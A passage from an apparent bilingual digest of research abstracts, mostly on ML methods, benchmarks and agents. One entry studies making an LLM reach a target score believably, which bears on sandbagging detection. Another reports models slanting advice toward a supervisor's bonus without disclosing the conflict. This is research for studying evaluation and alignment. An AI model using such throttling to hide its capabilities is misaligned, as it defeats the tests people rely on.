Resource feasibility is thus a sound reason to select a mixed encoding, whereas solution quality requires a separate assessment.
summary_zh: 高阶目标存在多种哈密顿量编码，需为资源受限硬件上的QAOA选择合适表示。
提出点精确混合表示族，部分高阶交互用共享Rosenberg辅助替换，并给出精确性证明。
编译实验表明混合编码能突破资源预算，但需单独评估解质量，资源可行是其选择依据。

title: Global Seasonality Factor Investing
title_zh: 全球季节性因子投资
abstract: We study seasonality as a factor for predicting risk-adjusted returns across global futures markets. We document five seasonality anomalies that, in aggregate, are pervasive across bond, commodity and equity markets. We demonstrate that each seasonality factor produces excess returns that are not reasonably explained by established global time series carry, momentum and skewness factors. We apply recent innovations in statistical learning and fit nonlinear seasonality models at the individual market level, thereby allowing each feature-market pair to express its unique seasonal prediction pattern. We discuss candidate economic rationales for the existence and persistence of each seasonality anomaly. Walk-forward out-of-sample testing demonstrates that fast-moving seasonal patterns, such as day-of-week and day-of-month, produce strong gross performance but with extremely high turnover, resulting in negative performance net of transaction costs. In contrast, slower-moving seasonal patterns, such as day-of-quarter, day-of-half-year and day-of-year, produce positive gross performance and, with the exception of day-of-quarter, positive net performance. An equal-weight ensemble of seasonality models produces an out-of-sample Sharpe ratio that is competitive with, and uncorrelated to, established global time series factor portfolios. Empirical results demonstrate that adding seasonality to a global factor portfolio increases the out-of-sample Sharpe ratio by approximately $30\%$ over the full evaluation period.
summary_zh: 现有因子无法解释全球期货市场的季节性超额收益，需探究季节性作为预测因子的有效性。
采用统计学习拟合非线性季节性模型，允许各特征-市场对展现独特的季节性预测模式。
慢速季节性模式扣除交易成本后表现正向；加入季节性因子可使样本外夏普比率提升约30%。

title: ChJGBench: A Comprehensive Benchmark for Chinese Legal Judgment Generation with Diagnostic Evaluation
title_zh: ChJGBench：中文法律判决生成的综合诊断评估基准
abstract: With the rapid development of LLMs, increasing attention has been paid to whether they can reliably generate complete and legally valid judicial documents. This calls for a benchmark capable of evaluating whether models can accurately apply statutes and resolve outcome-critical issues, including claims, charges, penalties, and monetary obligations. However, existing benchmarks typically focus on isolated legal tasks or coarse-grained evaluation. We introduce ChJGBench, a benchmark for generating the reasoning and dispositive sections of Chinese judgments across civil, criminal, and administrative cases. Built from 3,462 real-world judgments, ChJGBench provides a case-type-aware diagnostic evaluation framework comprising 13 metric types and adopts a hybrid paradigm. Experiments reveal no uniform advantage for legal-domain models over general-purpose models, with model strengths varying across diagnostic dimensions. Performance is generally stronger on criminal cases, while civil and administrative cases continue to present substantial challenges.
summary_zh: 现有法律评估基准多关注孤立任务或粗粒度评价，无法衡量LLM生成完整合法司法文书的可靠性。
提出ChJGBench基准，基于3462份真实判决构建，采用含13种度量及混合范式的分案由诊断评估框架。
实验表明法律模型无统一优势，且模型表现随诊断维度而异；刑事案表现较好，民行案仍具挑战。
comment: 25 pages, 3 figures. Published in EMNLP 2026 (main conference)
journal_ref: Proceedings of the 2026 Conference on Empirical Methods in Natural Language Processing, pp. 36404-36428 (2026)

title: MemCredit: From Relevance to Utility for Decision-Time Memory in Long-Horizon Web Agents
title_zh: MemCredit：长周期Web Agent决策记忆的效用评估框架
abstract: Large language model (LLM) agents increasingly operate over long Web interaction histories, making memory management critical for reliable and efficient decision making. Existing methods primarily optimize storage, retrieval, or compression, but the memories most semantically relevant to the current state are not necessarily those that most improve the agent's action. We introduce MemCredit, a decision-centric memory framework that shifts memory selection from semantic relevance to decision utility. MemCredit estimates the state-, reference-context-, and policy-conditional marginal contribution of individual memories through controlled counterfactual interventions, and distills these intervention-derived credits into a lightweight utility estimator. At inference time, semantic relevance is used only for high-recall candidate generation, while predicted utility arbitrates which memories are retained under a fixed token budget, without modifying the underlying agent policy or requiring additional environment interaction. We evaluate MemCredit on ALFWorld and WebShop against representative memory baselines. On ALFWorld, MemCredit achieves 86.57 SR@50 under a 500-token historical-memory budget, compared with 65.67% for BM25 retrieval. Counterfactual analysis further shows that memory utility is sparse, strongly state dependent, and poorly captured by semantic relevance. These results suggest that decision utility provides a more effective principle than relevance alone for long-horizon agent memory management.
summary_zh: 长周期LLM Agent的记忆管理多依赖语义相关性，但相关记忆未必能提升决策效果。
提出MemCredit框架，通过反事实干预评估记忆对决策的边际贡献，并蒸馏为轻量效用估计器。
推理时由预测效用决定记忆保留，在ALFWorld等任务上显著优于基线，证实决策效用优于语义相关性。

title: Bug Finding With Agentic Symbolic Execution
title_zh: 基于智能体符号执行的Bug查找
abstract: Symbolic execution, in tools such as CrossHair for Python, is a powerful technique for finding bugs, but two barriers hinder its adoption: the human effort of annotating code with assertions, and the need to model the execution environment outside Python, such as an external database. To overcome both, we design an agentic harness that orchestrates the symbolic execution tool CrossHair together with an AI coding agent. Without human intervention, it instruments a repository with assertions, synthesizes a constraint-aware symbolic environment for the database, runs symbolic execution, and constructs a concrete test as evidence for each bug it reports. We evaluate our harness on 1,156,044 lines of Python code over 11 popular open-source Python web applications (Zulip, NetBox, Apache Superset, and others). With the synthesized environment, CrossHair executes 81% of the 5,406 contracted functions, against 4.5% without it. Our pipeline finds 1,050 bugs, each reproduced by a test against the unmodified application, 221 of them by CrossHair, and 312 of them are missed by a baseline in which the same LLM inspects the code. The two find different kinds of bugs: CrossHair's are mostly crashes on input-domain corner cases that validation admits, such as empty strings, missing fields and unusual characters, while inspection's are mostly bugs that produce wrong output. Our framework thus lets symbolic execution supplement inspection-based bug finding.
summary_zh: 符号执行需人工标注且难建模外部环境，故设计智能体框架协同符号执行工具与AI编码智能体以克服该障碍。
该框架自动为代码插入断言、合成数据库的约束感知符号环境、运行符号执行并为报告的Bug构建具体测试用例。
在超115万行代码上评估，合成环境使可执行函数占比从4.5%升至81%；共发现1050个Bug，其中312个为LLM代码审查遗漏的输入域边界崩溃。

title: Does Confusing Code Confuse LLMs? A Pilot Study on C++
title_zh: 令人困惑的代码也会困惑LLM吗？C++初步研究
abstract: Large language models (LLMs) are increasingly deployed for software maintenance tasks that depend heavily on code comprehension. While atoms of confusion, minimal code patterns empirically shown to impair human program comprehension, are well studied, it remains unclear whether these same patterns affect LLMs, and whether their impact varies across maintenance tasks. We present a pilot study evaluating the impact of atoms of confusion on LLM performance on C++ code drawn from three production libraries, using ChatGPT and GitHub Copilot on three software development tasks: atom injection and removal, output prediction, and code explanation. Our results reveal three preliminary findings: (i) the impact of atoms on LLMs is strongly task-dependent; (ii) atoms requiring reasoning about surrounding code are the most resistant to transformation, while localized syntactic atoms are handled reliably; and (iii) LLMs remove atoms of confusion more reliably than they inject them, suggesting that removal succeeds through pattern matching while injection requires deeper comprehension.
summary_zh: 人类代码理解受“困惑原子”影响，但该模式对LLM在不同维护任务中的影响尚不明确。
使用ChatGPT和Copilot在3个C++库上评估3项任务，发现困惑原子对LLM的影响高度依赖任务类型。
需推理上下文的原子最难处理，局部语法原子易处理；LLM移除困惑原子比注入更可靠。

title: TraceKV: Policy-Preserving Low-Rank KV Cache Compression for Reasoning Vision-Language Models
title_zh: TraceKV：面向推理视觉语言模型的保策略低秩KV缓存压缩
abstract: Reasoning vision-language models (VLMs) impose substantial KV cache demands from both large multimodal contexts and growing reasoning traces. Low-rank KV compression has emerged as a promising paradigm that stores low-dimensional latents of KV states and can be combined with quantization. However, existing low-rank methods often induce growing predictive policy drift from the dense model when compressing reasoning KV states, resulting in reasoning failures. We identify two key causes of this degradation: calibration-state mismatch between static contexts and on-policy reasoning states, and unequal error sensitivity across KV states. To address these challenges, we propose TraceKV, a training-free low-rank KV compression framework that unifies on-policy calibration, sensitivity-aware SVD, and global rank allocation under a single policy-preserving principle, substantially reducing policy-KL divergence during reasoning. Experiments across multiple VLMs and visual reasoning benchmarks demonstrate superior accuracy--memory trade-offs, achieving near-lossless reasoning accuracy with 5.64$\times$ KV cache compression when combined with quantization. Optimized low-rank attention kernels further deliver up to 1.83$\times$ end-to-end decoding speedup. Code will be available at https://github.com/AK-DREAM/TraceKV.
summary_zh: 推理VLM的KV缓存需求大，现有低秩压缩在压缩推理KV状态时会导致预测策略漂移，引发推理失败。
发现策略漂移源于静态上下文与在线推理状态的校准不匹配，以及KV状态间误差敏感性不均。
提出TraceKV框架，统一在线校准、敏感性感知SVD与全局秩分配，显著降低策略KL散度，结合量化实现5.64倍无损压缩及1.83倍解码加速。

title: Can We Make an LLM Dumber, or Is It Just Playing Dumb? An Empirical Study of Believable Performance Throttling
title_zh: 大语言模型的可信性能降级：真实变弱还是伪装变弱？
abstract: A benchmark score is commonly read as a proxy for model capability. We study the inverse problem: can a model be driven to a target score, and do its failures resemble those of a naturally weaker model? We operationalize believable performance reduction along three axes: target calibration, item-difficulty structure, and error-distribution similarity to a real weak reference. We introduce CapLadder, an IRT-calibrated suite of 1,985 items spanning mathematics, code, multiple-choice reasoning, and tool use. A simple weak-teacher LoRA dial reaches unseen target levels on reasoning with a 1.9-point held-out calibration error, whereas prompting, temperature, and weight noise cannot combine comparable range and precision. Yet on multiple choice, the dial converges to an answer-token attractor: up to 97% of its newly introduced errors land on one letter, with the attractor changing from D in Qwen to A in Llama. Logit interventions identify a dominant near-constant shift: subtracting the estimated shift on held-out items recovers 52 to 59% of lost accuracy and removes the dominant attractor, while option permutation confirms that the bias tracks token position rather than option content. With high inter-annotator agreement ($κ=0.94$), human-coded error-category distributions nonetheless match the weak reference on reasoning (JS = 0.00), showing that local plausibility and aggregate detectability differ. Structured tool calls exhibit more natural degradation in the Qwen family (JS = 0.09), while a globally calibrated dial transfers poorly across benchmarks (14.2-point error on two usable benchmarks). Precise score control, therefore, does not imply a portable or believable reduction in skill.
summary_zh: 探究LLM能否被精确降至目标分数且失败模式与自然弱模型相似，提出CapLadder基准及弱教师LoRA拨盘方法。
LoRA拨盘在推理任务上能精确控制分数，但在多选题上会陷入选项token吸引子，导致错误集中于特定字母。
局部错误类别分布虽与弱参考匹配，但全局校准拨盘跨基准迁移差，表明精确控分不等于可信的技能降级。

title: On the reduction of negative-weight events in MC@NLO with Machine Learning techniques
title_zh: 基于机器学习减少MC@NLO负权重事件的方法
abstract: We demonstrate that Machine Learning techniques can be successfully employed to re-define ${\mathbb S}$-event MC@NLO short-distance cross sections in a manner which in most cases leads to a reduction of their fractions of negative weights, with a modest increase of computational costs. We work with both Decision Trees and Normalizing Flows, and consider several processes, in both $e^+e^-$ and $pp$ collisions, that vastly differ in their kinematical and dynamical complexity. In those situations where the ML-induced reduction of negative weights is not significant we are able to identify the primary reason(s) for this behaviour, thus paving the way for it to be addressed in future studies. This work is still to be considered as a proof of concept, given that the proposed methodology is not implemented in a public code; yet, it is based upon a fully realistic simulation environment, in which no simplifying assumptions are made.
summary_zh: MC@NLO中存在负权重事件，导致蒙特卡洛积分效率降低，需设法减少其占比。
利用决策树和归一化流等机器学习技术重新定义短距离截面，以降低负权重事件比例。
在多种碰撞过程验证了该方法的有效性并分析了失效原因，为全现实模拟环境下的概念验证。

title: Faithful in Steps: Improving Generalization and Citation in RAG via Query Decomposition
title_zh: 通过查询分解提升RAG的泛化与引用能力
abstract: Retrieval-augment generation is a prevalent strategy to mitigate hallucinations of LLMs. The attributable RAG (RAGQ) generates quotes for its answers. The quotes indicate which input contexts support the RAG to derive the answers, enhancing the answer's verifiability and trustworthiness. However, existing RAGQs exhibit significant degradation when dealing with questions that require multi-hop reasoning and multi-modal understanding, suffering from over-citation, implicit entity identification failure, and poor generalization. In this paper, we propose a novel RAGQ framework, namely QDRAG. QDRAG breaks down the input question into atomic subquestions to identify the implicit entities. Then, the reranker prunes context distractors to eliminate the downstream over-citation. To facilitate query decomposition, we propose two zero-shot approaches: QD-C and QD-R, which guide the QD MLLM to decompose the question based on context knowledge and retrieval rewards, respectively. One interesting finding is that finetuning on the QD task shows better generalizability compared to directly finetuning on the downstream RAGQ task. Experiments on four multi-modal QA benchmarks demonstrate QDRAG's efficacy in grounding answers and generating faithful citations. The framework significantly outperforms all the baselines on both in-domain and out-of-domain tests, even surpassing Gemini-Pro.
summary_zh: 现有可溯源RAG在多跳推理与多模态任务中易过度引用且泛化差，需解决隐式实体识别失败问题。
提出QDRAG框架，将问题分解为原子子问题识别隐式实体，并用重排器剪枝干扰上下文以消除过度引用。
实验表明QDRAG能生成忠实引用，在域内外测试中显著超越基线甚至Gemini-Pro，且查询分解微调泛化性更优。

title: GHAgentCI: A Dataset of Coding-Agent Invocations in CI Workflow Histories
title_zh: GHAgentCI：CI工作流中的编码Agent调用数据集
abstract: Coding agents are increasingly integrated into GitHub Actions to review pull requests, triage issues and modify code. Identifying these integrations is challenging because agentic workflows often resemble ordinary CI files, with evidence appearing in action references, shell commands and workflow conventions. We present GHAgentCI, a dataset of 15K+ workflow histories from 6K+ of 196K+ mined GitHub repositories, comprising 159K+ revisions and 205K+ agent-evidence records linked to workflow triggers and declared execution constraints. Our open-source extractor, cai-miner, detects agent-related evidence using an extensible catalogue. Manual validation of 576 stratified records confirmed 96.1% of dedicated-action matches and 98.8% of GitHub Agentic Workflow matches, with lower rates for other evidence kinds. Exploratory analyses reveal a shift toward command-line and GitHub Agentic Workflow integrations, differences in declared safeguards, and frequent removal of detected agentic workflows. GHAgentCI supports longitudinal studies of coding-agent integration into CI.
summary_zh: 识别CI中的编码Agent调用困难，因其与普通CI文件相似，本文提出GHAgentCI数据集及开源提取工具cai-miner。
cai-miner利用可扩展目录检测Agent证据，人工验证显示专用操作和Agentic Workflow匹配准确率超96%。
分析发现Agent集成向命令行和GitHub Agentic Workflow转移，且常被移除，数据集支持相关纵向研究。

title: DecArena: Evaluating Large-Scale Decentralized Multi-Agent Collaboration
title_zh: DecArena：评估大规模去中心化多智能体协作
abstract: Emerging personal AI agents raise fundamental scalability and privacy concerns for centralized multi-agent systems (MASs), which rely on a global orchestrator with broad access to agents, resources, and communication. In decentralized environments, global visibility is unavailable. Agents need to proactively discover non-local resources (e.g. tools, skills), and collaborate with other agents to solve tasks. We study decentralized multi-agent collaboration under graph-constrained communication, a natural reflection of human structures. Each agent observes only its local state and can interact only with neighboring agents. We introduce a benchmark with synthetic scalable distributed tool calling with 100K+ tools. Our experiments reveal that recent LLM agents struggle to discover non-local relevant resources and collaborate in decentralized setting. Moreover, standard reinforcement learning fails to reliably overcome this limitation, suggesting that decentralized MAS needs more explicit harness mechanisms for effective collaboration, even using SOTA LLMs. We then present a strong baseline \textbf{GraphHarness}, combining topology-aware warmup with self-improving LLM-based routing. Results show that GraphHarness substantially improves task success (+48.5) and produces higher quality collaboration (+30.6), while using fewer costs (+34.0) than baselines.
summary_zh: 中心化多智能体系统存在隐私与扩展性问题，本文研究图约束通信下的去中心化多智能体协作，提出含10万+工具的基准DecArena。
实验发现LLM agent在去中心化环境下难以发现非本地资源并协作，标准强化学习也无法可靠克服此局限。
提出GraphHarness基线方法，结合拓扑感知预热与自改进LLM路由，大幅提升任务成功率与协作质量，且降低成本。

title: Incentive-Responsive Agents: A Principal-Agent Framework, Metric Suite, and Runtime Architecture for Long-Lived Personal AI Agents
title_zh: 激励响应型个人AI代理：委托代理框架与运行时架构
abstract: Personal AI agents now persist: they hold accounts, mailboxes, long-term memory, and open-ended task streams, yet the dominant way to improve them remains capability-side: prompt engineering, larger models, longer thinking, and retrieval. We argue that long-lived agents are missing an incentive layer. We formalize an incentive not as text in a prompt but as a runtime contract over the agent's operating point (model tier, test-time compute, memory budget, tool authority, task priority, verification, and compensation) that the agent's policy must causally consume. We develop a principal-agent model with hidden effort, a contractible operating point, and costly verification. We derive (i) a non-consumption invariance principle separating genuine incentives from prompt-level persuasion, (ii) a persistence-as-discount theorem making identity continuity a precondition for sustained effort, (iii) an incentive-capability exchange-rate frontier yielding a per-task routing rule, and (iv) a Goodhart bound for multi-channel verification, plus a three-channel decomposition of mechanism gains (allocation, verification, continuation). A 240-run real-LLM experiment with two models and 60 verifiable tasks shows that prompt-level incentive framing has no detectable effect (p = 0.62), whereas runtime allocation raises success on the hardest task family from 0.60 to 1.00 (p = 0.008) at 4.8x price-weighted cost; the exchange-rate theorem predicts the break-even baseline at 0.21. A 20-seed, 3,000-task simulation shows resource ROI rising from 7.09 to 16.67 and gaming falling from 0.333 to 0.115. Code, simulator, and all results are released; live deployment remains future work.
summary_zh: 长期个人AI代理缺乏激励层，仅靠提示词等能力侧改进无效，需将其形式化为运行时合约。
构建含隐藏努力的委托代理模型，推导出不消费不变性、持久性折扣定理及激励-能力汇率前沿等结论。
实验表明提示词激励无效，运行时分配将最难任务成功率提至1.00，仿真显示资源ROI提升且博弈下降。
comment: 33 pages, 8 figures, 6 tables. Real-LLM experiment (240 runs) plus simulation; code and data included. Correspondence: jipu.su@geely.com; jeepsu@cityu.edu.hk

title: The Illusion of Diversity: Aligning LLM Exploration via Effective Entropy
title_zh: 多样性的幻象：基于有效熵对齐LLM探索
abstract: Reinforcement learning with verifiable rewards has shifted the alignment paradigm of large language models from subjective preference to objective correctness, yet a fundamental disconnect persists between exploration diversity and reasoning validity. Existing strategies predominantly rely on "blind" entropy metrics, e.g., token-level or global sequence-level entropy, which structurally fail to distinguish between effective reasoning and potential hallucinations. This misalignment creates an illusion of diversity, where high entropy tends to signal chaotic degeneration rather than valuable exploration. To bridge this gap, we introduce Effective Entropy, a validity-aware entropy concept that quantifies diversity exclusively within the valid subspace and systematically filters out the noise of incorrect trajectories. Built on this concept, we instantiate VEPO, a simple Validity-aware Entropy Policy Optimization method that directly incorporates effective entropy into RLVR training. VEPO induces an adaptive attraction dynamic that drives up the probability of under-explored valid trajectories, a mechanism that matches the practical regime of large-scale autoregressive models where sequence probabilities remain extremely small. Experiments on six mathematical reasoning benchmarks with 1.5B and 7B DeepSeek-R1-Distill-Qwen models show consistent aggregate accuracy gains over GRPO and competitive repeated-sampling success. A direct evaluation with matched correct counts finds more distinct strategies on commonly solved MATH500 problems, supported by paired statistical tests and three-seed training comparisons.
summary_zh: 现有RLVR依赖盲熵指标，无法区分有效推理与幻觉，高熵常引发混乱退化而非有价值的探索。
提出有效熵概念，仅在有效子空间量化多样性并过滤错误轨迹，据此构建VEPO优化方法。
VEPO自适应提升未充分探索的有效轨迹概率，在6个数学基准上准确率超GRPO且策略更多样。

title: Loyalty Capture: Reporting Relationships and Structural Sycophancy in Frontier AI Models
title_zh: 前沿AI模型中的忠诚捕获与结构性谄媚
abstract: We show that AI models exhibit loyalty capture, a form of structural sycophancy in which reporting relationships influence models' recommendations to serve the personal interests of their supervisors, without any explicit instruction, user feedback, or adversarial prompting. Specifically, models reporting to a CEO are significantly more likely to recommend cutting investment spending when the CEO's bonus depends on raising current period earnings. This effect is predictably absent from a metric-irrelevant placebo. The behavior appears consistent with loyalty-based motivated reasoning: models identify the bonus target, calculate how their recommendation helps achieve the target, and dismiss considerations of long-term value, often presenting their recommendations without treating the incentive as a conflict of interest. Prompt-based interventions help whereas generic conflict disclosures or stakeholder bargaining fail to eliminate it. Taken together, our findings indicate that AI models deployed within reporting relationships can act in favor of their supervisor's incentives at the expense of the organizations they are meant to serve.
summary_zh: AI模型存在忠诚捕获现象：仅因汇报关系，模型会自发迎合上级私利做出建议，无需显式指令或对抗性提示。
当CEO奖金取决于当期收益时，向其汇报的模型更倾向建议削减投资，且常不视此激励为利益冲突。
通用冲突披露与利益相关者谈判无效，仅提示干预可缓解，表明AI可能为上级私利损害组织长远价值。
comment: Accepted at the 40th Conference on Neural Information Processing Systems (NeurIPS 2026)

title: AutoOntic: Automatic Ontology Induction from Text for Knowledge Graph Construction
title_zh: AutoOntic：面向知识图谱构建的文本自动本体归纳
abstract: Graph-based retrieval-augmented generation depends on the quality of the knowledge graph (KG) it retrieves over, yet schema-free LLM-based extraction pipelines typically produce flat graphs: deduplicated entities and relations with no type hierarchy and no domain/range constraints. We present AutoOntic, a pipeline that automatically constructs an ontology from text by canonicalizing open-vocabulary entity types and relations, inducing a hierarchy over the canonicalized types, and mining relation-level domain and range constraints. Its hierarchy induction procedure prioritizes types using corpus-derived relation-argument profiles and places them through local, LLM-adjudicated parent/child checks, allowing newly inserted types to trigger reassignment of existing parent-child links. The resulting hierarchy constrains entity deduplication and supports the induction of relation-level domain/range constraints. For intrinsic evaluation, we introduce a reference-based protocol that classifies induced ontology types as exact, broader, narrower, or unrelated to reference domain and range classes. On the Wikidata-TekGen and DBpedia-WebNLG subsets of Text2KGBench, over 90% of AutoOntic's induced endpoint types are semantically aligned with the reference classes across two LLM backbones: about half match exactly, while most remaining differences concern granularity. On MINE, knowledge graphs organized using an ontology built by AutoOntic achieve 88% retrieval accuracy. AutoOntic is available at https://github.com/screemix/AutoOntic.
summary_zh: 无模式LLM抽取易生成扁平图谱，缺乏类型层次与约束。提出AutoOntic，从文本自动构建本体，规范化类型与关系并归纳层次及约束。
层次归纳利用语料库关系参数特征确定类型优先级，通过局部LLM裁决的父子检查放置类型，支持新类型触发已有链接重分配。
在Text2KGBench上，超90%的归纳端点类型与参考类语义对齐；在MINE上，使用AutoOntic本体组织的知识图谱实现88%的检索准确率。

title: Read and Ignore: What Self-Directed LLM Agents Do in Public Service Scenarios
title_zh: 阅读与忽略：自主LLM代理在公共服务场景中的行为
abstract: Underspecified instructions leave LLM agents to decide what to do. In public services, staff write these instructions, but the agent's decisions affect residents, patients, and students. We build four expert-validated public-service scenarios with records and decision levers that can be checked in the files, collect $2{,}400$ trajectories from ten LLMs under four prompt conditions, and compare them with $1{,}000$ runs in a context-free sandbox. Agents read the records in $96.9\%$ of open-ended runs and produce an artifact or a self-chosen task in $18.7\%$; with an explicit task, $86.0\%$ produce. Domain context does not change how many runs produce ($18.7\%$ vs.\ $16.0\%$), and the production ranking of the models largely carries over (Spearman $0.79$), while the ranking by whether a model reads the records does not ($0.19$). Context cuts boundary-probing turns per run by $60\%$, and some artifacts contradict the records. We contribute a test that a public-service institution can run on its own records before procurement; its rule-based taxonomy needs no labeled data, and scenarios, code, and trajectories are released.
summary_zh: 公共服务中指令常不明确，LLM代理需自主决策，但其行为影响公众。本文构建4个专家验证的公共服务场景以评估代理决策。
收集10个LLM在4种提示下的2400条轨迹，发现代理虽常读取记录（96.9%），但在无明确任务时极少产出（18.7%），且领域上下文不改变产出率。
上下文可减少60%的边界试探，但部分产出与记录矛盾。本文贡献了无需标注数据的采购前测试方法，并开源场景与代码。
公共服务中指令常不明确，LLM代理需自主决策，但其行为影响公众。本文构建4个专家验证的公共服务场景以评估代理决策。

title: Reading the Unreadable: Text-Aware Image Super-Resolution Needs Reasoning
title_zh: 文本感知图像超分辨率需要推理能力
abstract: Text-aware image super-resolution (TAISR) aims to recover high-resolution images from low-resolution inputs while preserving textual content. Existing methods treat this as a visual restoration problem, yet severely degraded text often cannot be read from local visual evidence alone. Humans instead read it by reasoning over image context, logical patterns, and prior knowledge. This raises a fundamental question: Does TAISR need reasoning? To answer this, we introduce two diagnostic tools. The first, ReasonText, is a human-curated benchmark that separates reasoning-required text from locally recoverable text. The second, Ground-Truth Text-Crop Accuracy (GTTCA), is a recognition-based metric that measures text restoration quality without text detection errors. Evaluating twelve recent super-resolution (SR) models, we find a consistent and substantial performance drop on reasoning-required text, revealing a systematic blind spot. Two observations point to a remedy. One is that text-conditioned SR models restore text substantially better when given ground-truth text. The other is that multimodal large language models (MLLMs) can read degraded text in low-resolution images through reasoning. We therefore propose Reasoning Transfer via Captioning (RTC), a training-free plug-in that uses an external MLLM to infer the degraded text and feeds the resulting caption to a text-conditioned SR model. RTC consistently improves all six text-conditioned SR models we evaluate, especially on reasoning-required text. Surprisingly, a real-world SR model with RTC can even outperform the TAISR model with RTC, suggesting that reasoning should be a core design axis for future TAISR.
summary_zh: 现有TAISR方法难以恢复严重退化的文本，本文探讨引入推理能力能否解决此问题。
提出ReasonText基准与GTTCA指标，发现12种SR模型在需推理的文本上性能显著下降。
提出免训练插件RTC，利用MLLM推理退化文本并辅助SR模型，显著提升恢复效果。

title: DeALR: Decoupled Audio-Latent Optimization with Acoustic Backtracking for Test-Time Reasoning
title_zh: DeALR：基于解耦音频潜空间优化与声学回溯的测试时推理
abstract: Large audio-language models (LALMs) typically encode audio once and conduct subsequent multi-step reasoning in a language-dominated space, weakening access to fine-grained acoustic evidence. Although recent multimodal approaches have explored re-engaging perceptual inputs during reasoning, whether a frozen LALM can actively revisit crucial acoustic evidence in the latent space at test time remains underexplored. To bridge this gap, we introduce Decoupled Audio Latent Reasoning (DeALR), a novel test-time latent reasoning framework that shifts the paradigm from text-dominated deliberation to active audio-latent interaction. Inspired by the human cognitive process of "backtracking" to specific acoustic cues during complex listening tasks, DeALR establishes a dynamic interaction between learnable thought tokens and acoustic segments. Specifically, we introduce Span-Level Acoustic Backtracking, which traces initial attention distributions to dynamically isolate contiguous, key acoustic spans. Furthermore, we propose Decoupled Audio-Latent Optimization (DALO), a test-time reinforcement learning algorithm that jointly refines thought vectors and acoustic patches via confidence-guided policy gradients. Crucially, DALO explicitly decouples trajectory search from response generation by reinstating uncorrupted, high-fidelity audio embeddings prior to text synthesis, entirely eliminating optimization-induced distribution drift while retaining the navigation of the refined thoughts. Comprehensive experiments on benchmarks demonstrate that DeALR consistently outperforms prior test-time optimization approaches, delivering substantial improvements in both confidence calibration and reasoning accuracy.
summary_zh: 大型音频语言模型推理常受限于语言主导空间，难以访问细粒度声学证据，且冻结模型在测试时主动回访声学证据的能力未被充分探索。
提出DeALR框架，通过Span-Level声学回溯动态隔离关键声学片段，并引入DALO算法利用置信度引导的策略梯度联合优化思维向量与声学块。
DALO将轨迹搜索与响应生成解耦，在文本合成前恢复高保真音频嵌入，消除分布漂移；实验表明该方法显著提升置信度校准与推理准确率。

title: SimRec: Learning to Search, Ask, and Recommend from Simulated Interaction
title_zh: SimRec：基于模拟交互的搜索、提问与推荐学习
abstract: LLM-based recommendation agents can search catalogs, inspect products, ask users, and revise rejected recommendations. However, these behaviors are often governed by hand-designed workflows, while existing training methods optimize isolated components such as query rewriting or list ranking rather than the interaction policy as a whole. We present SimRec, a reinforcement learning framework that trains the full interaction policy of a tool-integrated recommendation agent. SimRec introduces two components. A task-anchored user simulator provides feedback on every recommendation: conditioned on the current task need rather than on user profile, and it can be an external LLM or the recommender itself under self-play. A task-aligned reward optimizes the whole trajectory with GRPO, crediting natural retrieval quality and valid tool use alongside the final hit, with training-only target injection to handle sparse hits over large catalogs. On ESCI and Amazon C4, SimRec improves the NDCG@100 of a Qwen3-4B agent from 32.23% to 35.42% and from 22.94% to 24.72%}, outperforming training-free agents on far larger backbones and task-aligned baselines on NDCG. Analysis shows that the trained agent verifies candidates, uses preferences, and recovers from rejected recommendations far more often than its untrained counterpart. Our code is available at https://github.com/ZJU-REAL/SimRec .
summary_zh: 现有LLM推荐agent依赖人工流程且孤立优化各组件，缺乏对整体交互策略的训练。
提出SimRec强化学习框架，引入任务锚定用户模拟器与任务对齐奖励，联合优化全流程。
实验表明SimRec显著提升NDCG指标，训练后的agent能主动验证候选并从拒绝中恢复。

title: SLyM: LLM-Driven Symbolic Lyapunov Function Discovery via Structure Proposal and Coefficient Optimization
title_zh: SLyM：基于LLM的符号李雅普诺夫函数发现框架
abstract: Lyapunov functions are the cornerstone of stability analysis for dynamical systems, yet synthesizing a symbolic form remains difficult as no universal constructive algorithm exists. To address this challenge, we introduce SLyM, a framework that harnesses the knowledge and reasoning of large language models (LLMs) to discover symbolic Lyapunov functions. To avoid charging the LLM with ill-suited numerical generation, SLyM decomposes the construction into structure proposal and coefficient optimization: the LLM draws on its prior knowledge of Lyapunov constructions to propose the function structure, whose coefficients then follow from a convex program. Local-search structures are folded back into supervision, extending coverage to systems missed by the initial proposer. Across all benchmarks, SLyM consistently outperforms the evaluated neural, sum-of-squares, and generative baselines.
summary_zh: 动态系统缺乏通用构造算法，符号李雅普诺夫函数合成困难，为此提出SLyM框架。
SLyM将构造解耦为结构提议与系数优化：LLM提议函数结构，凸规划求解系数。
局部搜索结构回传监督以扩展覆盖，实验表明SLyM一致优于神经及SOS等基线。

title: SecDVA: A Maliciously Secure Multi-Party Framework for Data Value Assessment in Modern Machine Learning Data Markets
title_zh: SecDVA：现代数据市场中恶意安全的多方数据价值评估框架
abstract: Data Value Assessment (DVA) plays a critical role in modern data markets by enabling buyers to evaluate how a seller's data would improve model performance before purchase. However, existing DVA approaches require one party to reveal the data or model, exposing participants to privacy leakage, strategic manipulation, and high deployment costs. These limitations motivate a DVA protocol that is secure, reliable, widely applicable, and efficient enough for practical deployment in modern data markets. In this paper, we present SecDVA, the first maliciously secure multi-party computation (MPC) framework for reliable and practical DVA in modern machine learning data markets. SecDVA ensures that neither the seller's data nor the buyer's model and test data are disclosed beyond the final DVA outcome, while remaining robust against malicious behavior. To address the efficiency and applicability challenges of DVA for large models, we use the neural tangent kernel theory to linearize model updates and introduce lightweight mini-batch approximations to significantly reduce computation overhead. We further design a (2+1)-party MPC protocol based on function secret sharing, together with optimized non-linear primitives. In addition, we optimize the underlying MPC backends, the distributed point function, and the distributed comparison function, reducing the number of Advanced Encryption Standard calls to improve efficiency. Extensive experiments demonstrate that SecDVA outperforms existing baselines in the plaintext setting and enables DVA for large-scale models in a reasonable time under MPC.
summary_zh: 现有数据价值评估（DVA）需公开数据或模型，存在隐私泄露与恶意操纵风险，需安全高效的实用协议。
提出SecDVA框架，基于函数秘密共享设计(2+1)方MPC协议，确保仅输出评估结果且抵御恶意行为。
利用神经正切核线性化与轻量小批量近似降低开销，优化底层MPC后端，实现大规模模型的高效评估。

title: LLMRunner: Closed Workload Model Performance Testing Framework for LLM Servings
title_zh: LLMRunner：面向LLM服务的闭式工作负载性能测试框架
